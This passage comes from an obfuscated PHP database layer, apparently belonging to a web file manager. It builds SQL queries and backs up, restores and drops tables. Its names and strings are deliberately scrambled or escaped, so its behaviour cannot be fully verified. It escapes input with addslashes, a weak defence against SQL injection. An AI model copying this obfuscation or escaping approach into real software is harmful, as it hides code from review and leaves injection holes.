$this->parseValue($Ω²ΎΝ·[1])); $πύ¬Ϊάκ .= $ιλΦδΉ» . $ΡΤ®Φ[53] . $this->exp[$Π“Ο–ό] . $ΡΤ®Φ[989] . $΄Τ«ΦμΨ . $ΡΤ®Φ[991]; } } elseif (preg_match($ΡΤ®Φ[1107], $Ω²ΎΝ·[0])) { $¶Ν¤η = is_string($Ω²ΎΝ·[1]) ? explode($ΡΤ®Φ[50], $Ω²ΎΝ·[1]) : $Ω²ΎΝ·[1]; $πύ¬Ϊάκ .= $ΡΤ®Φ[989] . $ιλΦδΉ» . $ΡΤ®Φ[53] . $this->exp[$Π“Ο–ό] . $ΡΤ®Φ[53] . $this->parseValue($¶Ν¤η[0]) . $ΡΤ®Φ[1090] . $this->parseValue($¶Ν¤η[1]) . $ΡΤ®Φ[358]; } else { think_exception(think_lang($ΡΤ®Φ[1093]) . $ΡΤ®Φ[4] . $Ω²ΎΝ·[0]); } } else { $ηΤλΦ = count($Ω²ΎΝ·); $΅βΰ…Θ = $ΡΤ®Φ[12]; if (is_string($Ω²ΎΝ·[$ηΤλΦ - 1])) { $΅βΰ…Θ = isset($Ω²ΎΝ·[$ηΤλΦ - 1]) ? strtoupper($Ω²ΎΝ·[$ηΤλΦ - 1]) : $ΡΤ®Φ[12]; if (in_array($΅βΰ…Θ, array($ΡΤ®Φ[1087], $ΡΤ®Φ[1088], $ΡΤ®Φ[1089]))) { $ηΤλΦ = $ηΤλΦ - 1; } } else { $΅βΰ…Θ = $ΡΤ®Φ[1087]; } for ($Ω«®®άμ = 0; $Ω«®®άμ < $ηΤλΦ; $Ω«®®άμ++) { $¶Ν¤η = is_array($Ω²ΎΝ·[$Ω«®®άμ]) ? $Ω²ΎΝ·[$Ω«®®άμ][1] : $Ω²ΎΝ·[$Ω«®®άμ]; if ($ΡΤ®Φ[375] == strtolower($Ω²ΎΝ·[$Ω«®®άμ][0])) { $πύ¬Ϊάκ .= $ΡΤ®Φ[340] . $ιλΦδΉ» . $ΡΤ®Φ[53] . $¶Ν¤η . $ΡΤ®Φ[1104] . $΅βΰ…Θ . $ΡΤ®Φ[53]; } else { $ϋΚ• §μ = is_array($Ω²ΎΝ·[$Ω«®®άμ]) ? $this->exp[strtolower($Ω²ΎΝ·[$Ω«®®άμ][0])] : $ΡΤ®Φ[509]; if (!$ϋΚ• §μ && is_array($Ω²ΎΝ·[$Ω«®®άμ]) && in_array($Ω²ΎΝ·[$Ω«®®άμ][0], array($ΡΤ®Φ[509], $ΡΤ®Φ[1097], $ΡΤ®Φ[1098], $ΡΤ®Φ[1099], $ΡΤ®Φ[1100], $ΡΤ®Φ[1101]))) { $ϋΚ• §μ = $Ω²ΎΝ·[$Ω«®®άμ][0]; } $πύ¬Ϊάκ .= $ΡΤ®Φ[340] . $ιλΦδΉ» . $ΡΤ®Φ[53] . $ϋΚ• §μ . $ΡΤ®Φ[53] . $this->parseValue($¶Ν¤η) . $ΡΤ®Φ[1104] . $΅βΰ…Θ . $ΡΤ®Φ[53]; } } $πύ¬Ϊάκ = substr($πύ¬Ϊάκ, 0, -4); } } else { $πύ¬Ϊάκ .= $ιλΦδΉ» . $ΡΤ®Φ[1108] . $this->parseValue($Ω²ΎΝ·); } return $πύ¬Ϊάκ; } protected function parseThinkWhere($νϋϊΣίΣ, $ΟΡΫΖφ) { $ζΧΝΌ• =& $_SERVER[γγάψ½]; $Β·Ώγ›π = $ζΧΝΌ•[12]; switch ($νϋϊΣίΣ) { case $ζΧΝΌ•[430]: $Β·Ώγ›π = $ΟΡΫΖφ; break; case $ζΧΝΌ•[1091]: $Β·Ώγ›π = is_string($ΟΡΫΖφ) ? $ΟΡΫΖφ : substr($this->parseWhere($ΟΡΫΖφ), 6); break; case $ζΧΝΌ•[1109]: parse_str($ΟΡΫΖφ, $‰Μ δβΡ); if (isset($‰Μ δβΡ[$ζΧΝΌ•[1086]])) { $Ί°¬η· = $ζΧΝΌ•[53] . strtoupper($‰Μ δβΡ[$ζΧΝΌ•[1086]]) . $ζΧΝΌ•[53]; unset($‰Μ δβΡ[$ζΧΝΌ•[1086]]); } else { $Ί°¬η· = $ζΧΝΌ•[1090]; } $Υ­ƒή–± = array(); foreach ($‰Μ δβΡ as $υΓιµ¬ => $ΆοώΓγΩ) { $Υ­ƒή–±[] = $this->parseKey($υΓιµ¬) . $ζΧΝΌ•[1108] . $this->parseValue($ΆοώΓγΩ); } $Β·Ώγ›π = implode($Ί°¬η·, $Υ­ƒή–±); break; } return $Β·Ώγ›π; } protected function parseLimit($΅¤“Εβ) { $¥άΔμν =& $_SERVER[γγάψ½]; return !empty($΅¤“Εβ) ? $¥άΔμν[51] . $΅¤“Εβ . $¥άΔμν[53] : $¥άΔμν[12]; } protected function parseJoin($…·άΞΑι) { $†ωρό =& $_SERVER[γγάψ½]; $ΪΛωΗ = $†ωρό[12]; if (!empty($…·άΞΑι)) { if (is_array($…·άΞΑι)) { foreach ($…·άΞΑι as $”»Μάθβ => $έ¤ώσ€¶) { if (!1 !== stripos($έ¤ώσ€¶, $†ωρό[1110])) { $ΪΛωΗ .= $†ωρό[53] . $έ¤ώσ€¶; } else { $ΪΛωΗ .= $†ωρό[1111] . $έ¤ώσ€¶; } } } else { $ΪΛωΗ .= $†ωρό[1111] . $…·άΞΑι; } } $ΪΛωΗ = preg_replace($†ωρό[1112], think_config($†ωρό[1016]) . $†ωρό[1113], $ΪΛωΗ); return $ΪΛωΗ; } protected function parseOrder($ΣΗκπί) { $ϊΉΗΥΝ =& $_SERVER[γγάψ½]; if (is_array($ΣΗκπί)) { $®πΓΧλ = array(); foreach ($ΣΗκπί as $βϊΎλ¦ό => $°Ϊ„) { if (is_numeric($βϊΎλ¦ό)) { $®πΓΧλ[] = $this->parseKey($°Ϊ„); } else { $°Ϊ„ = in_array(strtoupper(trim($°Ϊ„)), array($ϊΉΗΥΝ[1114], $ϊΉΗΥΝ[1115])) ? $ϊΉΗΥΝ[53] . $°Ϊ„ : $ϊΉΗΥΝ[12]; if (preg_match($ϊΉΗΥΝ[1116], $βϊΎλ¦ό)) { $®πΓΧλ[] = $this->parseKey($βϊΎλ¦ό) . $°Ϊ„; } else { think_exception($ϊΉΗΥΝ[1117] . $βϊΎλ¦ό); } } } $ΣΗκπί = implode($ϊΉΗΥΝ[50], $®πΓΧλ); } return !empty($ΣΗκπί) ? $ϊΉΗΥΝ[1118] . $ΣΗκπί : $ϊΉΗΥΝ[12]; } protected function parseGroup($†κ¥άδϊ) { $€ΘΛ°ΦΈ =& $_SERVER[γγάψ½]; return !empty($†κ¥άδϊ) ? $€ΘΛ°ΦΈ[1119] . $†κ¥άδϊ : $€ΘΛ°ΦΈ[12]; } protected function parseHaving($²Ν¥‚·Ξ) { $ΐΥΊέπ΅ =& $_SERVER[γγάψ½]; return !empty($²Ν¥‚·Ξ) ? $ΐΥΊέπ΅[1120] . $²Ν¥‚·Ξ : $ΐΥΊέπ΅[12]; } protected function parseComment($®ϊ‚΅™) { $—ΈΟς• =& $_SERVER[γγάψ½]; return !empty($®ϊ‚΅™) ? $—ΈΟς•[1121] . $®ϊ‚΅™ . $—ΈΟς•[1122] : $—ΈΟς•[12]; } protected function parseDistinct($ΆΥΐ”Τ) { $®²»¨ƒλ =& $_SERVER[γγάψ½]; return !empty($ΆΥΐ”Τ) ? $®²»¨ƒλ[1123] : $®²»¨ƒλ[12]; } protected function parseUnion($±ΈσΧγπ) { $¦§ΓΔΑί =& $_SERVER[γγάψ½]; if (empty($±ΈσΧγπ)) { return $¦§ΓΔΑί[12]; } if (isset($±ΈσΧγπ[$¦§ΓΔΑί[426]])) { $σ»µ = $¦§ΓΔΑί[1124]; unset($±ΈσΧγπ[$¦§ΓΔΑί[426]]); } else { $σ»µ = $¦§ΓΔΑί[1125]; } foreach ($±ΈσΧγπ as $‰Ήυ―½) { $ηΥάλ[] = $σ»µ . (is_array($‰Ήυ―½) ? $this->buildSelectSql($‰Ήυ―½) : $‰Ήυ―½); } return implode($¦§ΓΔΑί[53], $ηΥάλ); } public function insert($¤‡ήΉ², $δΎ«όχ– = array(), $·η…¦θ² = false) { $Υλ—ΰ²φ =& $_SERVER[γγάψ½]; $¤ΧΑβχ = $Άιθα€ = array(); $this->model = $δΎ«όχ–[$Υλ—ΰ²φ[361]]; foreach ($¤‡ήΉ² as $Β‰γΉχ => $Λτ·έΦ) { if (is_array($Λτ·έΦ) && $Υλ—ΰ²φ[375] == $Λτ·έΦ[0]) { $Άιθα€[] = $this->parseKey($Β‰γΉχ); $¤ΧΑβχ[] = $Λτ·έΦ[1]; } elseif (is_scalar($Λτ·έΦ) || is_null($Λτ·έΦ)) { $Άιθα€[] = $this->parseKey($Β‰γΉχ); $¤ΧΑβχ[] = $this->parseValue($Λτ·έΦ); } } $ΆΕΟ–‹ = ($·η…¦θ² ? $Υλ—ΰ²φ[993] : $Υλ—ΰ²φ[994]) . $Υλ—ΰ²φ[995] . $this->parseTable($δΎ«όχ–[$Υλ—ΰ²φ[359]]) . $Υλ—ΰ²φ[989] . implode($Υλ—ΰ²φ[50], $Άιθα€) . $Υλ—ΰ²φ[990] . implode($Υλ—ΰ²φ[50], $¤ΧΑβχ) . $Υλ—ΰ²φ[991]; $ΆΕΟ–‹ .= $this->parseLock(isset($δΎ«όχ–[$Υλ—ΰ²φ[924]]) ? $δΎ«όχ–[$Υλ—ΰ²φ[924]] : !1); $ΆΕΟ–‹ .= $this->parseComment(!empty($δΎ«όχ–[$Υλ—ΰ²φ[432]]) ? $δΎ«όχ–[$Υλ—ΰ²φ[432]] : $Υλ—ΰ²φ[12]); return $this->execute($ΆΕΟ–‹, $this->parseBind(!empty($δΎ«όχ–[$Υλ—ΰ²φ[363]]) ? $δΎ«όχ–[$Υλ—ΰ²φ[363]] : array())); } public function selectInsert($’›ƒΪΎ, $ΟΖΛΊΨƒ, $› £ = array()) { $²Κϋ©Θ =& $_SERVER[γγάψ½]; $this->model = $› £[$²Κϋ©Θ[361]]; if (is_string($’›ƒΪΎ)) { $’›ƒΪΎ = explode($²Κϋ©Θ[50], $’›ƒΪΎ); } array_walk($’›ƒΪΎ, array($this, $²Κϋ©Θ[992])); $βΛ·έ–ζ = $²Κϋ©Θ[1126] . $this->parseTable($ΟΖΛΊΨƒ) . $²Κϋ©Θ[989] . implode($²Κϋ©Θ[50], $’›ƒΪΎ) . $²Κϋ©Θ[1104]; $βΛ·έ–ζ .= $this->buildSelectSql($› £); return $this->execute($βΛ·έ–ζ, $this->parseBind(!empty($› £[$²Κϋ©Θ[363]]) ? $› £[$²Κϋ©Θ[363]] : array())); } public function update($“χθ™, $ — †•) { $Τν™· =& $_SERVER[γγάψ½]; $this->model = $ — †•[$Τν™·[361]]; $‹ψχό¥ = $Τν™·[1127] . $this->parseTable($ — †•[$Τν™·[359]]) . $this->parseSet($“χθ™) . $this->parseWhere(!empty($ — †•[$Τν™·[355]]) ? $ — †•[$Τν™·[355]] : $Τν™·[12]) . $this->parseOrder(!empty($ — †•[$Τν™·[444]]) ? $ — †•[$Τν™·[444]] : $Τν™·[12]) . $this->parseLimit(!empty($ — †•[$Τν™·[370]]) ? $ — †•[$Τν™·[370]] : $Τν™·[12]) . $this->parseLock(isset($ — †•[$Τν™·[924]]) ? $ — †•[$Τν™·[924]] : !1) . $this->parseComment(!empty($ — †•[$Τν™·[432]]) ? $ — †•[$Τν™·[432]] : $Τν™·[12]); return $this->execute($‹ψχό¥, $this->parseBind(!empty($ — †•[$Τν™·[363]]) ? $ — †•[$Τν™·[363]] : array())); } public function delete($σΟώ©Ϊ€ = array()) { $°‘ία‚‡ =& $_SERVER[γγάψ½]; $this->model = $σΟώ©Ϊ€[$°‘ία‚‡[361]]; $‡π™ΡΦΌ = $°‘ία‚‡[1128] . $this->parseTable($σΟώ©Ϊ€[$°‘ία‚‡[359]]) . $this->parseWhere(!empty($σΟώ©Ϊ€[$°‘ία‚‡[355]]) ? $σΟώ©Ϊ€[$°‘ία‚‡[355]] : $°‘ία‚‡[12]) . $this->parseOrder(!empty($σΟώ©Ϊ€[$°‘ία‚‡[444]]) ? $σΟώ©Ϊ€[$°‘ία‚‡[444]] : $°‘ία‚‡[12]) . $this->parseLimit(!empty($σΟώ©Ϊ€[$°‘ία‚‡[370]]) ? $σΟώ©Ϊ€[$°‘ία‚‡[370]] : $°‘ία‚‡[12]) . $this->parseLock(isset($σΟώ©Ϊ€[$°‘ία‚‡[924]]) ? $σΟώ©Ϊ€[$°‘ία‚‡[924]] : !1) . $this->parseComment(!empty($σΟώ©Ϊ€[$°‘ία‚‡[432]]) ? $σΟώ©Ϊ€[$°‘ία‚‡[432]] : $°‘ία‚‡[12]); return $this->execute($‡π™ΡΦΌ, $this->parseBind(!empty($σΟώ©Ϊ€[$°‘ία‚‡[363]]) ? $σΟώ©Ϊ€[$°‘ία‚‡[363]] : array())); } public function select($¨»—–Ρ = array()) { $ΥΐΎΉΑ =& $_SERVER[γγάψ½]; $this->model = $¨»—–Ρ[$ΥΐΎΉΑ[361]]; $ίϊ°¥Ω§ = $this->buildSelectSql($¨»—–Ρ); $Α΅ίΥΜ‹ = isset($¨»—–Ρ[$ΥΐΎΉΑ[427]]) ? $¨»—–Ρ[$ΥΐΎΉΑ[427]] : !1; if ($Α΅ίΥΜ‹) { $έ­½«Ϊ‚ = is_string($Α΅ίΥΜ‹[$ΥΐΎΉΑ[97]]) ? $Α΅ίΥΜ‹[$ΥΐΎΉΑ[97]] : $ΥΐΎΉΑ[1129] . md5($ίϊ°¥Ω§); $Δ­δΗβ™ = think_cache($έ­½«Ϊ‚, $ΥΐΎΉΑ[12], $Α΅ίΥΜ‹); if (!1 !== $Δ­δΗβ™) { return $Δ­δΗβ™; } } $„ΓκΑµ = $this->query($ίϊ°¥Ω§, $this->parseBind(!empty($¨»—–Ρ[$ΥΐΎΉΑ[363]]) ? $¨»—–Ρ[$ΥΐΎΉΑ[363]] : array())); if ($Α΅ίΥΜ‹ && !1 !== $„ΓκΑµ) { think_cache($έ­½«Ϊ‚, $„ΓκΑµ, $Α΅ίΥΜ‹); } return $„ΓκΑµ; } public function buildSelectSql($νφ‹ζυΩ = array()) { $®ƒ¶Ίί =& $_SERVER[γγάψ½]; if (isset($νφ‹ζυΩ[$®ƒ¶Ίί[431]])) { if (strpos($νφ‹ζυΩ[$®ƒ¶Ίί[431]], $®ƒ¶Ίί[50])) { list($Ημϋ•λ£, $ΟΌεαΟϋ) = explode($®ƒ¶Ίί[50], $νφ‹ζυΩ[$®ƒ¶Ίί[431]]); } else { $Ημϋ•λ£ = $νφ‹ζυΩ[$®ƒ¶Ίί[431]]; } $Ημϋ•λ£ = $Ημϋ•λ£ ? $Ημϋ•λ£ : 1; $ΟΌεαΟϋ = isset($ΟΌεαΟϋ) ? $ΟΌεαΟϋ : (is_numeric($νφ‹ζυΩ[$®ƒ¶Ίί[370]]) ? $νφ‹ζυΩ[$®ƒ¶Ίί[370]] : 20); $‚ΥΕΤ± = $ΟΌεαΟϋ * ((int) $Ημϋ•λ£ - 1); $νφ‹ζυΩ[$®ƒ¶Ίί[370]] = $‚ΥΕΤ± . $®ƒ¶Ίί[50] . $ΟΌεαΟϋ; } if (think_config($®ƒ¶Ίί[1130])) { $λ­ΙΒΙ† = $®ƒ¶Ίί[1131] . md5(serialize($νφ‹ζυΩ)); $Ψ„γ§Χε = think_cache($λ­ΙΒΙ†); if ($Ψ„γ§Χε) { return $Ψ„γ§Χε; } } $¦ή£ζ®ή = $this->parseSql($this->selectSql, $νφ‹ζυΩ); $¦ή£ζ®ή .= $this->parseLock(isset($νφ‹ζυΩ[$®ƒ¶Ίί[924]]) ? $νφ‹ζυΩ[$®ƒ¶Ίί[924]] : !1); if (isset($λ­ΙΒΙ†)) { think_cache($λ­ΙΒΙ†, $¦ή£ζ®ή); } return $¦ή£ζ®ή; } public function parseSql($ϊυ¬ΣΠ, $ΡπΆϋ‡ = array()) { $ΧψΨΰ±Ψ =& $_SERVER[γγάψ½]; $ϊυ¬ΣΠ = str_replace(array($ΧψΨΰ±Ψ[1132], $ΧψΨΰ±Ψ[1133], $ΧψΨΰ±Ψ[1134], $ΧψΨΰ±Ψ[1135], $ΧψΨΰ±Ψ[1136], $ΧψΨΰ±Ψ[1137], $ΧψΨΰ±Ψ[1138], $ΧψΨΰ±Ψ[1139], $ΧψΨΰ±Ψ[1140], $ΧψΨΰ±Ψ[1141], $ΧψΨΰ±Ψ[1142]), array($this->parseTable("{$ΡπΆϋ‡[$ΧψΨΰ±Ψ[359]]}"), $this->parseDistinct(isset($ΡπΆϋ‡[$ΧψΨΰ±Ψ[1143]]) ? $ΡπΆϋ‡[$ΧψΨΰ±Ψ[1143]] : !1), $this->parseField(!empty($ΡπΆϋ‡[$ΧψΨΰ±Ψ[353]]) ? $ΡπΆϋ‡[$ΧψΨΰ±Ψ[353]] : $ΧψΨΰ±Ψ[223]), $this->parseJoin(!empty($ΡπΆϋ‡[$ΧψΨΰ±Ψ[362]]) ? $ΡπΆϋ‡[$ΧψΨΰ±Ψ[362]] : $ΧψΨΰ±Ψ[12]), $this->parseWhere(!empty($ΡπΆϋ‡[$ΧψΨΰ±Ψ[355]]) ? $ΡπΆϋ‡[$ΧψΨΰ±Ψ[355]] : $ΧψΨΰ±Ψ[12]), $this->parseGroup(!empty($ΡπΆϋ‡[$ΧψΨΰ±Ψ[583]]) ? $ΡπΆϋ‡[$ΧψΨΰ±Ψ[583]] : $ΧψΨΰ±Ψ[12]), $this->parseHaving(!empty($ΡπΆϋ‡[$ΧψΨΰ±Ψ[1144]]) ? $ΡπΆϋ‡[$ΧψΨΰ±Ψ[1144]] : $ΧψΨΰ±Ψ[12]), $this->parseOrder(!empty($ΡπΆϋ‡[$ΧψΨΰ±Ψ[444]]) ? $ΡπΆϋ‡[$ΧψΨΰ±Ψ[444]] : $ΧψΨΰ±Ψ[12]), $this->parseLimit(!empty($ΡπΆϋ‡[$ΧψΨΰ±Ψ[370]]) ? $ΡπΆϋ‡[$ΧψΨΰ±Ψ[370]] : $ΧψΨΰ±Ψ[12]), $this->parseUnion(!empty($ΡπΆϋ‡[$ΧψΨΰ±Ψ[425]]) ? $ΡπΆϋ‡[$ΧψΨΰ±Ψ[425]] : $ΧψΨΰ±Ψ[12]), $this->parseComment(!empty($ΡπΆϋ‡[$ΧψΨΰ±Ψ[432]]) ? $ΡπΆϋ‡[$ΧψΨΰ±Ψ[432]] : $ΧψΨΰ±Ψ[12])), $ϊυ¬ΣΠ); return $ϊυ¬ΣΠ; } public function getLastSql($Έ–Ξμρψ = '') { return $Έ–Ξμρψ ? $this->modelSql[$Έ–Ξμρψ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($„Η άΨΆ) { return addslashes($„Η άΨΆ); } public function setModel($»Όκό‰) { $this->model = $»Όκό‰; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ΖΑΘτ¬ = array()) { $¶½υ”‰α =& $_SERVER[γγάψ½]; if (empty($ΖΑΘτ¬)) { $ΖΑΘτ¬ = $GLOBALS[$¶½υ”‰α[6]][$¶½υ”‰α[21]]; } $this->database = $ΖΑΘτ¬; } public function model($Όηδκ— = '') { return new ModelBase($Όηδκ—, $_SERVER[γγάψ½][12], $this->database); } public function db($Σ¬΅ΨκΜ = false) { $µ™΄†Ψ¦ =& $_SERVER[γγάψ½]; $ϊρξΫ = array_change_key_case($this->database); if ($this->dbType() == $µ™΄†Ψ¦[13] || !$Σ¬΅ΨκΜ) { return $this->model()->db(); } $ΐΜ³”ΜΕ = $ϊρξΫ[$µ™΄†Ψ¦[1058]]; $ϊρξΫ[$µ™΄†Ψ¦[1058]] = $µ™΄†Ψ¦[12]; if ($ϊρξΫ[$µ™΄†Ψ¦[1053]] == $µ™΄†Ψ¦[1050]) { $·αΛι = $ϊρξΫ[$µ™΄†Ψ¦[1059]]; $ϊρξΫ[$µ™΄†Ψ¦[1059]] = substr($·αΛι, 0, strrpos($·αΛι, $µ™΄†Ψ¦[1145])); } $this->database = $ϊρξΫ; $Νϋή³•γ = $this->model()->db(); try { $ζωυΔΒ = $Νϋή³•γ->execute("\163\150\x6f\x77\40\x64\141\x74\141\142\x61\163\x65\x73\x20\154\151\x6b\145\x20\x27{$ΐΜ³”ΜΕ}\x27"); } catch (Exception $Η¦¤ΙΎ) { } if (!$ζωυΔΒ) { $Νϋή³•γ->execute("\143\162\x65\x61\x74\145\40\x64\x61\x74\141\142\x61\163\145\40\140{$ΐΜ³”ΜΕ}\140"); } $ϊρξΫ[$µ™΄†Ψ¦[1058]] = $ΐΜ³”ΜΕ; if ($ϊρξΫ[$µ™΄†Ψ¦[1053]] == $µ™΄†Ψ¦[1050]) { $ϊρξΫ[$µ™΄†Ψ¦[1059]] .= $µ™΄†Ψ¦[1145] . $ΐΜ³”ΜΕ; } $this->database = $ϊρξΫ; $Νϋή³•γ->execute("\165\x73\145\x20\140{$ΐΜ³”ΜΕ}\140"); return $Νϋή³•γ; } public function createTable($ΚΝώΚλΆ, &$γ•±π¶¬) { $½ΫέΞ΄Ί =& $_SERVER[γγάψ½]; if (!IO::exist($ΚΝώΚλΆ)) { ActionCall($½ΫέΞ΄Ί[1146], !0, 0); show_json(LNG($½ΫέΞ΄Ί[1147]), !1); } $τΠ¶­‹® = $this->model()->db(); $ψ΄ι’ζ = sqlSplit(IO::getContent($ΚΝώΚλΆ)); foreach ($ψ΄ι’ζ as $υνμ) { $Τφψΰ« = stripos($υνμ, $½ΫέΞ΄Ί[1148]) === 0; if ($Τφψΰ«) { $γ•±π¶¬->task[$½ΫέΞ΄Ί[1149]] += 1; } $τΠ¶­‹®->execute($υνμ); if ($Τφψΰ«) { preg_match($½ΫέΞ΄Ί[1150], $υνμ, $ΝόηΓΞ); $γ•±π¶¬->task[$½ΫέΞ΄Ί[1151]] = $ΝόηΓΞ[1]; $γ•±π¶¬->update(1); } } } public function insertTable($ηιΐ•, &$’Μ―Όΐκ) { $Ξ¦•σ =& $_SERVER[γγάψ½]; $Φ›Ν = $this->model()->db(); $νΧϋ―κ = $ΌυΒΆο ? array($ΌυΒΆο) : $Φ›Ν->getTables(); foreach ($ηιΐ• as $¦λ»χΎ) { $ΌυΒΆο = basename($¦λ»χΎ, $Ξ¦•σ[865]); if (!in_array($ΌυΒΆο, $νΧϋ―κ)) { continue; } $’Μ―Όΐκ->task[$Ξ¦•σ[1151]] = $ΌυΒΆο; if (get_filesize($¦λ»χΎ) == 0) { continue; } $‘¨¶Ε΄ = $this->sqlToDb($¦λ»χΎ, $’Μ―Όΐκ); if (!$‘¨¶Ε΄) { ActionCall($Ξ¦•σ[1146], !0, 0); show_json(LNG($Ξ¦•σ[1152]) . "\x5b{$ΌυΒΆο}\x5d", !1); } } } public function sqlFromDb($ς‘υ…Ϋ, $Ο–ξίΕΙ, &$ήΧ©τΉ, $€¶‚ώ’ = '') { if ($ήΧ©τΉ) { $ήΧ©τΉ->task[$_SERVER[γγάψ½][1151]] = $ς‘υ…Ϋ; } $ΐ―ΤΒ = $this->model($ς‘υ…Ϋ); $ν¨¤…Ί = 0; $ƒδΆΙ‹ό = 0; $ΛΒΚδ = 10000; $Π€Γ = fopen($Ο–ξίΕΙ, $_SERVER[γγάψ½][1153]); $εΟμμχύ = $ΐ―ΤΒ->getPk(); $‡΅ΎΔϋΦ = $ΐ―ΤΒ->getDbFields(); $Α®¶Η = $_SERVER[γγάψ½][12]; if ($GLOBALS[$_SERVER[γγάψ½][864]] && in_array($ς‘υ…Ϋ, array($_SERVER[γγάψ½][1154], $_SERVER[γγάψ½][1155]))) { $Α®¶Η = $ς‘υ…Ϋ; } do { $π΄·ƒΥ» = array($εΟμμχύ => array($_SERVER[γγάψ½][1100], $ƒδΆΙ‹ό)); $Π΅Ω³ = $ΐ―ΤΒ->where($π΄·ƒΥ»)->field($‡΅ΎΔϋΦ)->order($εΟμμχύ . $_SERVER[γγάψ½][1156])->limit($ΛΒΚδ)->select(); $Π΅Ω³ = !empty($Π΅Ω³) ? $Π΅Ω³ : array(); if (!($βψΞΆΆ = count($Π΅Ω³))) { break; } $Ετ”λ = end($Π΅Ω³); $ƒδΆΙ‹ό = $Ετ”λ[$εΟμμχύ]; $­έύ¤§τ = array(); foreach ($Π΅Ω³ as $υΕΐΨφ΅) { if ($Α®¶Η) { if ($ς‘υ…Ϋ == $_SERVER[γγάψ½][1154]) { if ($υΕΐΨφ΅[$_SERVER[γγάψ½][33]] == $_SERVER[γγάψ½][1157]) { $Ί­³¨έΙ = json_decode($υΕΐΨφ΅[$_SERVER[γγάψ½][453]], !0); if ($Ί­³¨έΙ[$_SERVER[γγάψ½][32]] == $GLOBALS[$_SERVER[γγάψ½][864]] && $Ί­³¨έΙ[$_SERVER[γγάψ½][825]] != 1) { continue; } } } else { if ($υΕΐΨφ΅[$_SERVER[γγάψ½][33]] == $_SERVER[γγάψ½][1158] && $υΕΐΨφ΅[$_SERVER[γγάψ½][97]] == $_SERVER[γγάψ½][860]) { continue; } } } if ($€¶‚ώ’) { $υΕΐΨφ΅[$_SERVER[γγάψ½][87]] = "\173\151\x6f\x3a{$€¶‚ώ’}\x7d" . substr($υΕΐΨφ΅[$_SERVER[γγάψ½][87]], strlen("\x7b\x69\x6f\72{$υΕΐΨφ΅[$_SERVER[γγάψ½][898]]}\x7d")); $υΕΐΨφ΅[$_SERVER[γγάψ½][898]] = $€¶‚ώ’; } $­έύ¤§τ[] = $_SERVER[γγάψ½][1159] . $this->sqlEncode($υΕΐΨφ΅) . $_SERVER[γγάψ½][1160]; } $›½΄ = "\x49\116\123\105\122\124\40\111\x4e\x54\117\x20\140{$ς‘υ…Ϋ}\140\x20\50\x60" . implode($_SERVER[γγάψ½][1161], $‡΅ΎΔϋΦ) . $_SERVER[γγάψ½][1162]; fwrite($Π€Γ, $›½΄ . implode($_SERVER[γγάψ½][1163], $­έύ¤§τ) . $_SERVER[γγάψ½][74] . PHP_EOL); $ν¨¤…Ί += $βψΞΆΆ; if ($ήΧ©τΉ) { $ήΧ©τΉ->update($βψΞΆΆ); } } while ($ΛΒΚδ == $βψΞΆΆ); fclose($Π€Γ); return $ν¨¤…Ί; } public function sqlToDb($›¥ΓΫθ, &$δ§υω‘) { $”ΨΥ‹ƒ« =& $_SERVER[γγάψ½]; $³ο…§λΓ = $this->model()->db(); $Ϋ«ΉθΙΈ = @fopen($›¥ΓΫθ, $”ΨΥ‹ƒ«[1164]); if (!$Ϋ«ΉθΙΈ) { return !1; } $ΰΘηΘ = 0; $–΅®Εψδ = $”ΨΥ‹ƒ«[12]; $‰οΚ η = array(); $γ―‹ΏΈΕ = $this->dbType(); $–«©‹η = $γ―‹ΏΈΕ == $”ΨΥ‹ƒ«[13] ? 500 : 2000; $…φ§¥ω = basename($›¥ΓΫθ, $”ΨΥ‹ƒ«[865]); $ΙΌΝΛΫΫ = 0; $ΠΏ²«·” = 4194304; while (!feof($Ϋ«ΉθΙΈ)) { $®“ά‘ςΣ = trim(fgets($Ϋ«ΉθΙΈ)); if (!$®“ά‘ςΣ) { continue; } $²“Ήά  = $this->sqlDecode($®“ά‘ςΣ, $γ―‹ΏΈΕ, $…φ§¥ω); if (stripos($²“Ήά , $”ΨΥ‹ƒ«[433]) === 0) { if (!$–΅®Εψδ) { $–΅®Εψδ = $²“Ήά  . $”ΨΥ‹ƒ«[53]; } continue; } if ($δ§υω‘) { $δ§υω‘->task[$”ΨΥ‹ƒ«[1149]] += 1; } $ΰΘηΘ++; $‰οΚ η[] = rtrim(rtrim(trim($²“Ήά ), $”ΨΥ‹ƒ«[50]), $”ΨΥ‹ƒ«[74]); $ΕΙΪζύ‰ = null; $¤΄α€ΥΑ = strlen($²“Ήά ); $ΙΌΝΛΫΫ += $¤΄α€ΥΑ; $ό»ΉάΖ = strlen($–΅®Εψδ) + $ΙΌΝΛΫΫ + (count($‰οΚ η) - 1); if ($ό»ΉάΖ >= $ΠΏ²«·”) { $ΕΙΪζύ‰ = array_pop($‰οΚ η); if ($ΰΘηΘ > 1) { $ΰΘηΘ--; } } if ($ΰΘηΘ >= $–«©‹η || $ΕΙΪζύ‰) { $²“Ήά  = $–΅®Εψδ . implode($”ΨΥ‹ƒ«[50], $‰οΚ η); if (!$³ο…§λΓ->execute($²“Ήά )) { return !1; } if ($δ§υω‘) { $δ§υω‘->update($ΰΘηΘ); } $‰οΚ η = array(); $ΰΘηΘ = 0; $ΙΌΝΛΫΫ = 0; if ($ΕΙΪζύ‰) { $‰οΚ η = array($ΕΙΪζύ‰); $ΰΘηΘ = 1; $ΙΌΝΛΫΫ = $¤΄α€ΥΑ; } } } fclose($Ϋ«ΉθΙΈ); if (!empty($‰οΚ η)) { $²“Ήά  = $–΅®Εψδ . implode($”ΨΥ‹ƒ«[50], $‰οΚ η); if (!$³ο…§λΓ->execute($²“Ήά )) { return !1; } if ($δ§υω‘) { $δ§υω‘->update($ΰΘηΘ); } } return !0; } public function dropTable($®«‰¬¥Π = null) { $χ”Ρ¥•² = $this->model()->db(); $γίΘ§ι‰ = $®«‰¬¥Π ? array($®«‰¬¥Π) : $χ”Ρ¥•²->getTables(); if (!$γίΘ§ι‰) { return; } foreach ($γίΘ§ι‰ as $®«‰¬¥Π) { if ($®«‰¬¥Π) { $®«‰¬¥Π = strtolower($®«‰¬¥Π); } else { continue; } $χ”Ρ¥•²->execute("\144\x72\x6f\x70\x20\164\141\x62\x6c\x65\x20\x69\x66\40\145\170\151\x73\x74\163\x20\x60{$®«‰¬¥Π}\140"); } } private function sqlEncode($ξ‹ΨΣΕ”) { $ΧΘΥΚ‘ =& 